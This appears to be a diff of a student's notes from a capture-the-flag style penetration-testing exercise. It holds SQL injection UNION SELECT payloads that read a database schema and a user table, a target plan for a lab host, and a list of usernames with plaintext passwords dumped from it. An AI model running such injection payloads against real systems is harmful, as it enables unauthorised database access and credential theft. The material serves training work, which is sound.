@@ -210,10 +210,34 @@ php?Selection=2 UNION SELECT table_schema,table_name,column_name FROM informatio
 
 php?Selection=2 UNION SELECT id,pass,name from session.user;
 
+Scheme of Maneuver:
+>Jump Box
+->T1:10.100.28.48
+
+Target Section:
+
+T1
+Hostname: donovian-nla
+IP: 10.100.28.48
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+Last Known HTTP Port: 80
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved SQLi Exploitation techniques to collect intelligence.
 
 
-
-
+Boss	Sm7KhQHoZ1DGfONxnkyt	3.00
+Maverick	turn&burn	3.00
+phreak	pwd	3.00
+Susan	flowers99	3.00
+TW	imAPlaya	3.00
+1-2-3-4	sayULuvM3	3.00
+rich_kid	1M$	3.00
+p0pStar	thrilla	3.00
+Joe	vato	3.00
+	flag:
 
 
 
